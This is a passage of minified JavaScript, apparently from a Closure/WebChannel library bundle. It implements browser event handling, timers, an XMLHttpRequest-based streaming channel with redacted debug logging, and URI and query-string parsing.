            if (m4) return /WebKit\/(\S+)/.exec(e);
            if (g4) return /(?:Version)[ \/]?(\S+)/.exec(e)
        }();
    if (Sr && ($l = Sr ? Sr[1] : ""), vn) {
        var Rl = Bd();
        if (Rl != null && Rl > parseFloat($l)) break e
    }
}
Y.document && vn && Bd();

function yn(e, t) {
    if (Ue.call(this, e ? e.type : ""), this.relatedTarget = this.g = this.target = null, this.button = this.screenY = this.screenX = this.clientY = this.clientX = 0, this.key = "", this.metaKey = this.shiftKey = this.altKey = this.ctrlKey = !1, this.state = null, this.pointerId = 0, this.pointerType = "", this.i = null, e) {
        var s = this.type = e.type,
            n = e.changedTouches && e.changedTouches.length ? e.changedTouches[0] : null;
        if (this.target = e.target || e.srcElement, this.g = t, t = e.relatedTarget) {
            if (jd) {
                e: {
                    try {
                        Ko(t.nodeName);
                        var i = !0;
                        break e
                    } catch {}
                    i = !1
                }
                i || (t = null)
            }
        } else s == "mouseover" ? t = e.fromElement : s == "mouseout" && (t = e.toElement);
        this.relatedTarget = t, n ? (this.clientX = n.clientX !== void 0 ? n.clientX : n.pageX, this.clientY = n.clientY !== void 0 ? n.clientY : n.pageY, this.screenX = n.screenX || 0, this.screenY = n.screenY || 0) : (this.clientX = e.clientX !== void 0 ? e.clientX : e.pageX, this.clientY = e.clientY !== void 0 ? e.clientY : e.pageY, this.screenX = e.screenX || 0, this.screenY = e.screenY || 0), this.button = e.button, this.key = e.key || "", this.ctrlKey = e.ctrlKey, this.altKey = e.altKey, this.shiftKey = e.shiftKey, this.metaKey = e.metaKey, this.pointerId = e.pointerId || 0, this.pointerType = typeof e.pointerType == "string" ? e.pointerType : v4[e.pointerType] || "", this.state = e.state, this.i = e, e.defaultPrevented && yn.$.h.call(this)
    }
}
Oe(yn, Ue);
var v4 = {
    2: "touch",
    3: "pen",
    4: "mouse"
};
yn.prototype.h = function() {
    yn.$.h.call(this);
    var e = this.i;
    e.preventDefault ? e.preventDefault() : e.returnValue = !1
};
var Ln = "closure_listenable_" + (1e6 * Math.random() | 0),
    y4 = 0;

function b4(e, t, s, n, i) {
    this.listener = e, this.proxy = null, this.src = t, this.type = s, this.capture = !!n, this.la = i, this.key = ++y4, this.fa = this.ia = !1
}

function Fi(e) {
    e.fa = !0, e.listener = null, e.proxy = null, e.src = null, e.la = null
}

function Zo(e, t, s) {
    for (const n in e) t.call(s, e[n], n, e)
}

function w4(e, t) {
    for (const s in e) t.call(void 0, e[s], s, e)
}

function Fd(e) {
    const t = {};
    for (const s in e) t[s] = e[s];
    return t
}
const Dl = "constructor hasOwnProperty isPrototypeOf propertyIsEnumerable toLocaleString toString valueOf".split(" ");

function zd(e, t) {
    let s, n;
    for (let i = 1; i < arguments.length; i++) {
        n = arguments[i];
        for (s in n) e[s] = n[s];
        for (let r = 0; r < Dl.length; r++) s = Dl[r], Object.prototype.hasOwnProperty.call(n, s) && (e[s] = n[s])
    }
}

function zi(e) {
    this.src = e, this.g = {}, this.h = 0
}
zi.prototype.add = function(e, t, s, n, i) {
    var r = e.toString();
    e = this.g[r], e || (e = this.g[r] = [], this.h++);
    var o = no(e, t, n, i);
    return -1 < o ? (t = e[o], s || (t.ia = !1)) : (t = new b4(t, this.src, r, !!n, i), t.ia = s, e.push(t)), t
};

function so(e, t) {
    var s = t.type;
    if (s in e.g) {
        var n = e.g[s],
            i = Hd(n, t),
            r;
        (r = 0 <= i) && Array.prototype.splice.call(n, i, 1), r && (Fi(t), e.g[s].length == 0 && (delete e.g[s], e.h--))
    }
}

function no(e, t, s, n) {
    for (var i = 0; i < e.length; ++i) {
        var r = e[i];
        if (!r.fa && r.listener == t && r.capture == !!s && r.la == n) return i
    }
    return -1
}
var Xo = "closure_lm_" + (1e6 * Math.random() | 0),
    Er = {};

function Ud(e, t, s, n, i) {
    if (n && n.once) return Wd(e, t, s, n, i);
    if (Array.isArray(t)) {
        for (var r = 0; r < t.length; r++) Ud(e, t[r], s, n, i);
        return null
    }
    return s = Jo(s), e && e[Ln] ? e.O(t, s, An(n) ? !!n.capture : !!n, i) : Gd(e, t, s, !1, n, i)
}

function Gd(e, t, s, n, i, r) {
    if (!t) throw Error("Invalid event type");
    var o = An(i) ? !!i.capture : !!i,
        l = Qo(e);
    if (l || (e[Xo] = l = new zi(e)), s = l.add(t, s, n, o, r), s.proxy) return s;
    if (n = x4(), s.proxy = n, n.src = e, n.listener = s, e.addEventListener) u4 || (i = o), i === void 0 && (i = !1), e.addEventListener(t.toString(), n, i);
    else if (e.attachEvent) e.attachEvent(Kd(t.toString()), n);
    else if (e.addListener && e.removeListener) e.addListener(n);
    else throw Error("addEventListener and attachEvent are unavailable.");
    return s
}

function x4() {
    function e(s) {
        return t.call(e.src, e.listener, s)
    }
    const t = _4;
    return e
}

function Wd(e, t, s, n, i) {
    if (Array.isArray(t)) {
        for (var r = 0; r < t.length; r++) Wd(e, t[r], s, n, i);
        return null
    }
    return s = Jo(s), e && e[Ln] ? e.P(t, s, An(n) ? !!n.capture : !!n, i) : Gd(e, t, s, !0, n, i)
}

function qd(e, t, s, n, i) {
    if (Array.isArray(t))
        for (var r = 0; r < t.length; r++) qd(e, t[r], s, n, i);
    else n = An(n) ? !!n.capture : !!n, s = Jo(s), e && e[Ln] ? (e = e.i, t = String(t).toString(), t in e.g && (r = e.g[t], s = no(r, s, n, i), -1 < s && (Fi(r[s]), Array.prototype.splice.call(r, s, 1), r.length == 0 && (delete e.g[t], e.h--)))) : e && (e = Qo(e)) && (t = e.g[t.toString()], e = -1, t && (e = no(t, s, n, i)), (s = -1 < e ? t[e] : null) && Yo(s))
}

function Yo(e) {
    if (typeof e != "number" && e && !e.fa) {
        var t = e.src;
        if (t && t[Ln]) so(t.i, e);
        else {
            var s = e.type,
                n = e.proxy;
            t.removeEventListener ? t.removeEventListener(s, n, e.capture) : t.detachEvent ? t.detachEvent(Kd(s), n) : t.addListener && t.removeListener && t.removeListener(n), (s = Qo(t)) ? (so(s, e), s.h == 0 && (s.src = null, t[Xo] = null)) : Fi(e)
        }
    }
}

function Kd(e) {
    return e in Er ? Er[e] : Er[e] = "on" + e
}

function _4(e, t) {
    if (e.fa) e = !0;
    else {
        t = new yn(t, this);
        var s = e.listener,
            n = e.la || e.src;
        e.ia && Yo(e), e = s.call(n, t)
    }
    return e
}

function Qo(e) {
    return e = e[Xo], e instanceof zi ? e : null
}
var Tr = "__closure_events_fn_" + (1e9 * Math.random() >>> 0);

function Jo(e) {
    return typeof e == "function" ? e : (e[Tr] || (e[Tr] = function(t) {
        return e.handleEvent(t)
    }), e[Tr])
}

function ke() {
    Yt.call(this), this.i = new zi(this), this.S = this, this.J = null
}
Oe(ke, Yt);
ke.prototype[Ln] = !0;
ke.prototype.removeEventListener = function(e, t, s, n) {
    qd(this, e, t, s, n)
};

function Re(e, t) {
    var s, n = e.J;
    if (n)
        for (s = []; n; n = n.J) s.push(n);
    if (e = e.S, n = t.type || t, typeof t == "string") t = new Ue(t, e);
    else if (t instanceof Ue) t.target = t.target || e;
    else {
        var i = t;
        t = new Ue(n, e), zd(t, i)
    }
    if (i = !0, s)
        for (var r = s.length - 1; 0 <= r; r--) {
            var o = t.g = s[r];
            i = Wn(o, n, !0, t) && i
        }
    if (o = t.g = e, i = Wn(o, n, !0, t) && i, i = Wn(o, n, !1, t) && i, s)
        for (r = 0; r < s.length; r++) o = t.g = s[r], i = Wn(o, n, !1, t) && i
}
ke.prototype.N = function() {
    if (ke.$.N.call(this), this.i) {
        var e = this.i,
            t;
        for (t in e.g) {
            for (var s = e.g[t], n = 0; n < s.length; n++) Fi(s[n]);
            delete e.g[t], e.h--
        }
    }
    this.J = null
};
ke.prototype.O = function(e, t, s, n) {
    return this.i.add(String(e), t, !1, s, n)
};
ke.prototype.P = function(e, t, s, n) {
    return this.i.add(String(e), t, !0, s, n)
};

function Wn(e, t, s, n) {
    if (t = e.i.g[String(t)], !t) return !0;
    t = t.concat();
    for (var i = !0, r = 0; r < t.length; ++r) {
        var o = t[r];
        if (o && !o.fa && o.capture == s) {
            var l = o.listener,
                a = o.la || o.src;
            o.ia && so(e.i, o), i = l.call(a, n) !== !1 && i
        }
    }
    return i && !n.defaultPrevented
}
var ea = Y.JSON.stringify;
class C4 {
    constructor(t, s) {
        this.i = t, this.j = s, this.h = 0, this.g = null
    }
    get() {
        let t;
        return 0 < this.h ? (this.h--, t = this.g, this.g = t.next, t.next = null) : t = this.i(), t
    }
}

function S4() {
    var e = ta;
    let t = null;
    return e.g && (t = e.g, e.g = e.g.next, e.g || (e.h = null), t.next = null), t
}
class E4 {
    constructor() {
        this.h = this.g = null
    }
    add(t, s) {
        const n = Zd.get();
        n.set(t, s), this.h ? this.h.next = n : this.g = n, this.h = n
    }
}
var Zd = new C4(() => new T4, e => e.reset());
class T4 {
    constructor() {
        this.next = this.g = this.h = null
    }
    set(t, s) {
        this.h = t, this.g = s, this.next = null
    }
    reset() {
        this.next = this.g = this.h = null
    }
}

function A4(e) {
    var t = 1;
    e = e.split(":");
    const s = [];
    for (; 0 < t && e.length;) s.push(e.shift()), t--;
    return e.length && s.push(e.join(":")), s
}

function L4(e) {
    Y.setTimeout(() => {
        throw e
    }, 0)
}
let bn, wn = !1,
    ta = new E4,
    Xd = () => {
        const e = Y.Promise.resolve(void 0);
        bn = () => {
            e.then(I4)
        }
    };
var I4 = () => {
    for (var e; e = S4();) {
        try {
            e.h.call(e.g)
        } catch (s) {
            L4(s)
        }
        var t = Zd;
        t.j(e), 100 > t.h && (t.h++, e.next = t.g, t.g = e)
    }
    wn = !1
};

function Ui(e, t) {
    ke.call(this), this.h = e || 1, this.g = t || Y, this.j = ze(this.qb, this), this.l = Date.now()
}
Oe(Ui, ke);
H = Ui.prototype;
H.ga = !1;
H.T = null;
H.qb = function() {
    if (this.ga) {
        var e = Date.now() - this.l;
        0 < e && e < .8 * this.h ? this.T = this.g.setTimeout(this.j, this.h - e) : (this.T && (this.g.clearTimeout(this.T), this.T = null), Re(this, "tick"), this.ga && (sa(this), this.start()))
    }
};
H.start = function() {
    this.ga = !0, this.T || (this.T = this.g.setTimeout(this.j, this.h), this.l = Date.now())
};

function sa(e) {
    e.ga = !1, e.T && (e.g.clearTimeout(e.T), e.T = null)
}
H.N = function() {
    Ui.$.N.call(this), sa(this), delete this.g
};

function na(e, t, s) {
    if (typeof e == "function") s && (e = ze(e, s));
    else if (e && typeof e.handleEvent == "function") e = ze(e.handleEvent, e);
    else throw Error("Invalid listener argument");
    return 2147483647 < Number(t) ? -1 : Y.setTimeout(e, t || 0)
}

function Yd(e) {
    e.g = na(() => {
        e.g = null, e.i && (e.i = !1, Yd(e))
    }, e.j);
    const t = e.h;
    e.h = null, e.m.apply(null, t)
}
class N4 extends Yt {
    constructor(t, s) {
        super(), this.m = t, this.j = s, this.h = null, this.i = !1, this.g = null
    }
    l(t) {
        this.h = arguments, this.g ? this.i = !0 : Yd(this)
    }
    N() {
        super.N(), this.g && (Y.clearTimeout(this.g), this.g = null, this.i = !1, this.h = null)
    }
}

function xn(e) {
    Yt.call(this), this.h = e, this.g = {}
}
Oe(xn, Yt);
var Hl = [];

function Qd(e, t, s, n) {
    Array.isArray(s) || (s && (Hl[0] = s.toString()), s = Hl);
    for (var i = 0; i < s.length; i++) {
        var r = Ud(t, s[i], n || e.handleEvent, !1, e.h || e);
        if (!r) break;
        e.g[r.key] = r
    }
}

function Jd(e) {
    Zo(e.g, function(t, s) {
        this.g.hasOwnProperty(s) && Yo(t)
    }, e), e.g = {}
}
xn.prototype.N = function() {
    xn.$.N.call(this), Jd(this)
};
xn.prototype.handleEvent = function() {
    throw Error("EventHandler.handleEvent not implemented")
};

function Gi() {
    this.g = !0
}
Gi.prototype.Ea = function() {
    this.g = !1
};

function P4(e, t, s, n, i, r) {
    e.info(function() {
        if (e.g)
            if (r)
                for (var o = "", l = r.split("&"), a = 0; a < l.length; a++) {
                    var c = l[a].split("=");
                    if (1 < c.length) {
                        var d = c[0];
                        c = c[1];
                        var p = d.split("_");
                        o = 2 <= p.length && p[1] == "type" ? o + (d + "=" + c + "&") : o + (d + "=redacted&")
                    }
                } else o = null;
            else o = r;
        return "XMLHTTP REQ (" + n + ") [attempt " + i + "]: " + t + `
` + s + `
` + o
    })
}

function M4(e, t, s, n, i, r, o) {
    e.info(function() {
        return "XMLHTTP RESP (" + n + ") [ attempt " + i + "]: " + t + `
` + s + `
` + r + " " + o
    })
}

function xs(e, t, s, n) {
    e.info(function() {
        return "XMLHTTP TEXT (" + t + "): " + O4(e, s) + (n ? " " + n : "")
    })
}

function k4(e, t) {
    e.info(function() {
        return "TIMEOUT: " + t
    })
}
Gi.prototype.info = function() {};

function O4(e, t) {
    if (!e.g) return t;
    if (!t) return null;
    try {
        var s = JSON.parse(t);
        if (s) {
            for (e = 0; e < s.length; e++)
                if (Array.isArray(s[e])) {
                    var n = s[e];
                    if (!(2 > n.length)) {
                        var i = n[1];
                        if (Array.isArray(i) && !(1 > i.length)) {
                            var r = i[0];
                            if (r != "noop" && r != "stop" && r != "close")
                                for (var o = 1; o < i.length; o++) i[o] = ""
                        }
                    }
                }
        }
        return ea(s)
    } catch {
        return t
    }
}
var Fs = {},
    Vl = null;

function ia() {
    return Vl = Vl || new ke
}
Fs.Ta = "serverreachability";

function ef(e) {
    Ue.call(this, Fs.Ta, e)
}
Oe(ef, Ue);

function _n(e) {
    const t = ia();
    Re(t, new ef(t))
}
Fs.STAT_EVENT = "statevent";

function tf(e, t) {
    Ue.call(this, Fs.STAT_EVENT, e), this.stat = t
}
Oe(tf, Ue);

function qe(e) {
    const t = ia();
    Re(t, new tf(t, e))
}
Fs.Ua = "timingevent";

function sf(e, t) {
    Ue.call(this, Fs.Ua, e), this.size = t
}
Oe(sf, Ue);

function In(e, t) {
    if (typeof e != "function") throw Error("Fn must not be null and must be a function");
    return Y.setTimeout(function() {
        e()
    }, t)
}
var ra = {
        NO_ERROR: 0,
        rb: 1,
        Eb: 2,
        Db: 3,
        yb: 4,
        Cb: 5,
        Fb: 6,
        Qa: 7,
        TIMEOUT: 8,
        Ib: 9
    },
    $4 = {
        wb: "complete",
        Sb: "success",
        Ra: "error",
        Qa: "abort",
        Kb: "ready",
        Lb: "readystatechange",
        TIMEOUT: "timeout",
        Gb: "incrementaldata",
        Jb: "progress",
        zb: "downloadprogress",
        $b: "uploadprogress"
    };

function oa() {}
oa.prototype.h = null;

function jl(e) {
    return e.h || (e.h = e.i())
}

function R4() {}
var Nn = {
    OPEN: "a",
    vb: "b",
    Ra: "c",
    Hb: "d"
};

function aa() {
    Ue.call(this, "d")
}
Oe(aa, Ue);

function la() {
    Ue.call(this, "c")
}
Oe(la, Ue);
var io;

function Wi() {}
Oe(Wi, oa);
Wi.prototype.g = function() {
    return new XMLHttpRequest
};
Wi.prototype.i = function() {
    return {}
};
io = new Wi;

function Pn(e, t, s, n) {
    this.l = e, this.j = t, this.m = s, this.W = n || 1, this.U = new xn(this), this.P = D4, e = to ? 125 : void 0, this.V = new Ui(e), this.I = null, this.i = !1, this.u = this.B = this.A = this.L = this.G = this.Y = this.C = null, this.F = [], this.g = null, this.o = 0, this.s = this.v = null, this.ca = -1, this.J = !1, this.O = 0, this.M = null, this.ba = this.K = this.aa = this.S = !1, this.h = new nf
}

function nf() {
    this.i = null, this.g = "", this.h = !1
}
var D4 = 45e3,
    rf = {},
    ro = {};
H = Pn.prototype;
H.setTimeout = function(e) {
    this.P = e
};

function oo(e, t, s) {
    e.L = 1, e.A = Ki(Ot(t)), e.u = s, e.S = !0, of (e, null)
}

function of (e, t) {
    e.G = Date.now(), Mn(e), e.B = Ot(e.A);
    var s = e.B,
        n = e.W;
    Array.isArray(n) || (n = [String(n)]), hf(s.i, "t", n), e.o = 0, s = e.l.J, e.h = new nf, e.g = $f(e.l, s ? t : null, !e.u), 0 < e.O && (e.M = new N4(ze(e.Pa, e, e.g), e.O)), Qd(e.U, e.g, "readystatechange", e.nb), t = e.I ? Fd(e.I) : {}, e.u ? (e.v || (e.v = "POST"), t["Content-Type"] = "application/x-www-form-urlencoded", e.g.ha(e.B, e.v, e.u, t)) : (e.v = "GET", e.g.ha(e.B, e.v, null, t)), _n(), P4(e.j, e.v, e.B, e.m, e.W, e.u)
}
H.nb = function(e) {
    e = e.target;
    const t = this.M;
    t && St(e) == 3 ? t.l() : this.Pa(e)
};
H.Pa = function(e) {
    try {
        if (e == this.g) e: {
            const d = St(this.g);
            var t = this.g.Ia();
            const p = this.g.da();
            if (!(3 > d) && (d != 3 || to || this.g && (this.h.h || this.g.ja() || Ul(this.g)))) {
                this.J || d != 4 || t == 7 || (t == 8 || 0 >= p ? _n(3) : _n(2)), qi(this);
                var s = this.g.da();
                this.ca = s;
                t: if (af(this)) {
                    var n = Ul(this.g);
                    e = "";
                    var i = n.length,
                        r = St(this.g) == 4;
                    if (!this.h.i) {
                        if (typeof TextDecoder > "u") {
                            is(this), an(this);
                            var o = "";
                            break t
                        }
                        this.h.i = new Y.TextDecoder
                    }
                    for (t = 0; t < i; t++) this.h.h = !0, e += this.h.i.decode(n[t], {
                        stream: r && t == i - 1
                    });
                    n.length = 0, this.h.g += e, this.o = 0, o = this.h.g
                } else o = this.g.ja();
                if (this.i = s == 200, M4(this.j, this.v, this.B, this.m, this.W, d, s), this.i) {
                    if (this.aa && !this.K) {
                        t: {
                            if (this.g) {
                                var l, a = this.g;
                                if ((l = a.g ? a.g.getResponseHeader("X-HTTP-Initial-Response") : null) && !mn(l)) {
                                    var c = l;
                                    break t
                                }
                            }
                            c = null
                        }
                        if (s = c) xs(this.j, this.m, s, "Initial handshake response via X-HTTP-Initial-Response"),
                        this.K = !0,
                        ao(this, s);
                        else {
                            this.i = !1, this.s = 3, qe(12), is(this), an(this);
                            break e
                        }
                    }
                    this.S ? (lf(this, d, o), to && this.i && d == 3 && (Qd(this.U, this.V, "tick", this.mb), this.V.start())) : (xs(this.j, this.m, o, null), ao(this, o)), d == 4 && is(this), this.i && !this.J && (d == 4 ? Pf(this.l, this) : (this.i = !1, Mn(this)))
                } else i5(this.g), s == 400 && 0 < o.indexOf("Unknown SID") ? (this.s = 3, qe(12)) : (this.s = 0, qe(13)), is(this), an(this)
            }
        }
    } catch {} finally {}
};

function af(e) {
    return e.g ? e.v == "GET" && e.L != 2 && e.l.Ha : !1
}

function lf(e, t, s) {
    let n = !0,
        i;
    for (; !e.J && e.o < s.length;)
        if (i = H4(e, s), i == ro) {
            t == 4 && (e.s = 4, qe(14), n = !1), xs(e.j, e.m, null, "[Incomplete Response]");
            break
        } else if (i == rf) {
        e.s = 4, qe(15), xs(e.j, e.m, s, "[Invalid Chunk]"), n = !1;
        break
    } else xs(e.j, e.m, i, null), ao(e, i);
    af(e) && e.o != 0 && (e.h.g = e.h.g.slice(e.o), e.o = 0), t != 4 || s.length != 0 || e.h.h || (e.s = 1, qe(16), n = !1), e.i = e.i && n, n ? 0 < s.length && !e.ba && (e.ba = !0, t = e.l, t.g == e && t.ca && !t.M && (t.l.info("Great, no buffering proxy detected. Bytes received: " + s.length), ha(t), t.M = !0, qe(11))) : (xs(e.j, e.m, s, "[Invalid Chunked Response]"), is(e), an(e))
}
H.mb = function() {
    if (this.g) {
        var e = St(this.g),
            t = this.g.ja();
        this.o < t.length && (qi(this), lf(this, e, t), this.i && e != 4 && Mn(this))
    }
};

function H4(e, t) {
    var s = e.o,
        n = t.indexOf(`
`, s);
    return n == -1 ? ro : (s = Number(t.substring(s, n)), isNaN(s) ? rf : (n += 1, n + s > t.length ? ro : (t = t.slice(n, n + s), e.o = n + s, t)))
}
H.cancel = function() {
    this.J = !0, is(this)
};

function Mn(e) {
    e.Y = Date.now() + e.P, cf(e, e.P)
}

function cf(e, t) {
    if (e.C != null) throw Error("WatchDog timer not null");
    e.C = In(ze(e.lb, e), t)
}

function qi(e) {
    e.C && (Y.clearTimeout(e.C), e.C = null)
}
H.lb = function() {
    this.C = null;
    const e = Date.now();
    0 <= e - this.Y ? (k4(this.j, this.B), this.L != 2 && (_n(), qe(17)), is(this), this.s = 2, an(this)) : cf(this, this.Y - e)
};

function an(e) {
    e.l.H == 0 || e.J || Pf(e.l, e)
}

function is(e) {
    qi(e);
    var t = e.M;
    t && typeof t.sa == "function" && t.sa(), e.M = null, sa(e.V), Jd(e.U), e.g && (t = e.g, e.g = null, t.abort(), t.sa())
}

function ao(e, t) {
    try {
        var s = e.l;
        if (s.H != 0 && (s.g == e || lo(s.i, e))) {
            if (!e.K && lo(s.i, e) && s.H == 3) {
                try {
                    var n = s.Ja.g.parse(t)
                } catch {
                    n = null
                }
                if (Array.isArray(n) && n.length == 3) {
                    var i = n;
                    if (i[0] == 0) {
                        e: if (!s.u) {
                            if (s.g)
                                if (s.g.G + 3e3 < e.G) yi(s), Qi(s);
                                else break e;
                            ua(s), qe(18)
                        }
                    }
                    else s.Fa = i[1], 0 < s.Fa - s.V && 37500 > i[2] && s.G && s.A == 0 && !s.v && (s.v = In(ze(s.ib, s), 6e3));
                    if (1 >= vf(s.i) && s.oa) {
                        try {
                            s.oa()
                        } catch {}
                        s.oa = void 0
                    }
                } else rs(s, 11)
            } else if ((e.K || s.g == e) && yi(s), !mn(t))
                for (i = s.Ja.g.parse(t), t = 0; t < i.length; t++) {
                    let c = i[t];
                    if (s.V = c[0], c = c[1], s.H == 2)
                        if (c[0] == "c") {
                            s.K = c[1], s.pa = c[2];
                            const d = c[3];
                            d != null && (s.ra = d, s.l.info("VER=" + s.ra));
                            const p = c[4];
                            p != null && (s.Ga = p, s.l.info("SVER=" + s.Ga));
                            const u = c[5];
                            u != null && typeof u == "number" && 0 < u && (n = 1.5 * u, s.L = n, s.l.info("backChannelRequestTimeoutMs_=" + n)), n = s;
                            const g = e.g;
                            if (g) {
                                const w = g.g ? g.g.getResponseHeader("X-Client-Wire-Protocol") : null;
                                if (w) {
                                    var r = n.i;
                                    r.g || w.indexOf("spdy") == -1 && w.indexOf("quic") == -1 && w.indexOf("h2") == -1 || (r.j = r.l, r.g = new Set, r.h && (ca(r, r.h), r.h = null))
                                }
                                if (n.F) {
                                    const b = g.g ? g.g.getResponseHeader("X-HTTP-Session-Id") : null;
                                    b && (n.Da = b, we(n.I, n.F, b))
                                }
                            }
                            s.H = 3, s.h && s.h.Ba(), s.ca && (s.S = Date.now() - e.G, s.l.info("Handshake RTT: " + s.S + "ms")), n = s;
                            var o = e;
                            if (n.wa = Of(n, n.J ? n.pa : null, n.Y), o.K) {
                                yf(n.i, o);
                                var l = o,
                                    a = n.L;
                                a && l.setTimeout(a), l.C && (qi(l), Mn(l)), n.g = o
                            } else If(n);
                            0 < s.j.length && Ji(s)
                        } else c[0] != "stop" && c[0] != "close" || rs(s, 7);
                    else s.H == 3 && (c[0] == "stop" || c[0] == "close" ? c[0] == "stop" ? rs(s, 7) : pa(s) : c[0] != "noop" && s.h && s.h.Aa(c), s.A = 0)
                }
        }
        _n(4)
    } catch {}
}

function V4(e) {
    if (e.Z && typeof e.Z == "function") return e.Z();
    if (typeof Map < "u" && e instanceof Map || typeof Set < "u" && e instanceof Set) return Array.from(e.values());
    if (typeof e == "string") return e.split("");
    if (ji(e)) {
        for (var t = [], s = e.length, n = 0; n < s; n++) t.push(e[n]);
        return t
    }
    t = [], s = 0;
    for (n in e) t[s++] = e[n];
    return t
}

function j4(e) {
    if (e.ta && typeof e.ta == "function") return e.ta();
    if (!e.Z || typeof e.Z != "function") {
        if (typeof Map < "u" && e instanceof Map) return Array.from(e.keys());
        if (!(typeof Set < "u" && e instanceof Set)) {
            if (ji(e) || typeof e == "string") {
                var t = [];
                e = e.length;
                for (var s = 0; s < e; s++) t.push(s);
                return t
            }
            t = [], s = 0;
            for (const n in e) t[s++] = n;
            return t
        }
    }
}

function df(e, t) {
    if (e.forEach && typeof e.forEach == "function") e.forEach(t, void 0);
    else if (ji(e) || typeof e == "string") Array.prototype.forEach.call(e, t, void 0);
    else
        for (var s = j4(e), n = V4(e), i = n.length, r = 0; r < i; r++) t.call(void 0, n[r], s && s[r], e)
}
var ff = RegExp("^(?:([^:/?#.]+):)?(?://(?:([^\\\\/?#]*)@)?([^\\\\/?#]*?)(?::([0-9]+))?(?=[\\\\/?#]|$))?([^?#]+)?(?:\\?([^#]*))?(?:#([\\s\\S]*))?$");

function B4(e, t) {
    if (e) {
        e = e.split("&");
        for (var s = 0; s < e.length; s++) {
            var n = e[s].indexOf("="),
                i = null;
            if (0 <= n) {
                var r = e[s].substring(0, n);
                i = e[s].substring(n + 1)
            } else r = e[s];
            t(r, i ? decodeURIComponent(i.replace(/\+/g, " ")) : "")
        }
    }
}

function ds(e) {
    if (this.g = this.s = this.j = "", this.m = null, this.o = this.l = "", this.h = !1, e instanceof ds) {
        this.h = e.h, mi(this, e.j), this.s = e.s, this.g = e.g, vi(this, e.m), this.l = e.l;
        var t = e.i,
            s = new Cn;
        s.i = t.i, t.g && (s.g = new Map(t.g), s.h = t.h), Bl(this, s), this.o = e.o
    } else e && (t = String(e).match(ff)) ? (this.h = !1, mi(this, t[1] || "", !0), this.s = Qs(t[2] || ""), this.g = Qs(t[3] || "", !0), vi(this, t[4]), this.l = Qs(t[5] || "", !0), Bl(this, t[6] || "", !0), this.o = Qs(t[7] || "")) : (this.h = !1, this.i = new Cn(null, this.h))
}
ds.prototype.toString = function() {
    var e = [],
        t = this.j;
    t && e.push(Js(t, Fl, !0), ":");
    var s = this.g;
    return (s || t == "file") && (e.push("//"), (t = this.s) && e.push(Js(t, Fl, !0), "@"), e.push(encodeURIComponent(String(s)).replace(/%25([0-9a-fA-F]{2})/g, "%$1")), s = this.m, s != null && e.push(":", String(s))), (s = this.l) && (this.g && s.charAt(0) != "/" && e.push("/"), e.push(Js(s, s.charAt(0) == "/" ? U4 : z4, !0))), (s = this.i.toString()) && e.push("?", s), (s = this.o) && e.push("#", Js(s, W4)), e.join("")
};

function Ot(e) {
    return new ds(e)
}

function mi(e, t, s) {
    e.j = s ? Qs(t, !0) : t, e.j && (e.j = e.j.replace(/:$/, ""))
}

function vi(e, t) {
    if (t) {
        if (t = Number(t), isNaN(t) || 0 > t) throw Error("Bad port number " + t);
        e.m = t
    } else e.m = null
}

function Bl(e, t, s) {
    t instanceof Cn ? (e.i = t, q4(e.i, e.h)) : (s || (t = Js(t, G4)), e.i = new Cn(t, e.h))
}

function we(e, t, s) {
    e.i.set(t, s)
}

function Ki(e) {
    return we(e, "zx", Math.floor(2147483648 * Math.random()).toString(36) + Math.abs(Math.floor(2147483648 * Math.random()) ^ Date.now()).toString(36)), e
}

function Qs(e, t) {
    return e ? t ? decodeURI(e.replace(/%25/g, "%2525")) : decodeURIComponent(e) : ""
}

function Js(e, t, s) {
    return typeof e == "string" ? (e = encodeURI(e).replace(t, F4), s && (e = e.replace(/%25([0-9a-fA-F]{2})/g, "%$1")), e) : null
}

function F4(e) {
    return e = e.charCodeAt(0), "%" + (e >> 4 & 15).toString(16) + (e & 15).toString(16)
}
var Fl = /[#\/\?@]/g,
    z4 = /[#\?:]/g,
    U4 = /[#\?]/g,
    G4 = /[#\?@]/g,
    W4 = /#/g;

function Cn(e, t) {
    this.h = this.g = null, this.i = e || null, this.j = !!t
}

function Qt(e) {
    e.g || (e.g = new Map, e.h = 0, e.i && B4(e.i, function(t, s) {
        e.add(decodeURIComponent(t.replace(/\+/g, " ")), s)
    }))
}
H = Cn.prototype;
H.add = function(e, t) {
    Qt(this), this.i = null, e = zs(this, e);
    var s = this.g.get(e);
    return s || this.g.set(e, s = []), s.push(t), this.h += 1, this
};

function pf(e, t) {
    Qt(e), t = zs(e, t), e.g.has(t) && (e.i = null, e.h -= e.g.get(t).length, e.g.delete(t))
}

function uf(e, t) {
    return Qt(e), t = zs(e, t), e.g.has(t)
}
H.forEach = function(e, t) {
    Qt(this), this.g.forEach(function(s, n) {
        s.forEach(function(i) {
            e.call(t, i, n, this)
        }, this)
    }, this)
};
H.ta = function() {
    Qt(this);
    const e = Array.from(this.g.values()),
        t = Array.from(this.g.keys()),
        s = [];
    for (let n = 0; n < t.length; n++) {
        const i = e[n];
        for (let r = 0; r < i.length; r++) s.push(t[n])
    }
    return s
};
H.Z = function(e) {
    Qt(this);
    let t = [];
    if (typeof e == "string") uf(this, e) && (t = t.concat(this.g.get(zs(this, e))));
    else {
        e = Array.from(this.g.values());
        for (let s = 0; s < e.length; s++) t = t.concat(e[s])
    }
    return t
};
H.set = function(e, t) {
    return Qt(this), this.i = null, e = zs(this, e), uf(this, e) && (this.h -= this.g.get(e).length), this.g.set(e, [t]), this.h += 1, this
};
H.get = function(e, t) {
    return e ? (e = this.Z(e), 0 < e.length ? String(e[0]) : t) : t
};

function hf(e, t, s) {
    pf(e, t), 0 < s.length && (e.i = null, e.g.set(zs(e, t), qo(s)), e.h += s.length)
}
H.toString = function() {
    if (this.i) return this.i;
    if (!this.g) return "";
    const e = [],
        t = Array.from(this.g.keys());
    for (var s = 0; s < t.length; s++) {
        var n = t[s];
        const r = encodeURIComponent(String(n)),
            o = this.Z(n);
        for (n = 0; n < o.length; n++) {
            var i = r;
            o[n] !== "" && (i += "=" + encodeURIComponent(String(o[n]))), e.push(i)
        }
    }
    return this.i = e.join("&")
};

function zs(e, t) {
    return t = String(t), e.j && (t = t.toLowerCase()), t
}

function q4(e, t) {
    t && !e.j && (Qt(e), e.i = null, e.g.forEach(function(s, n) {
        var i = n.toLowerCase();
        n != i && (pf(this, n), hf(this, i, s))
    }, e)), e.j = t
}
var K4 = class {
    constructor(e, t) {
        this.g = e, this.map = t
    }
};

function gf(e) {
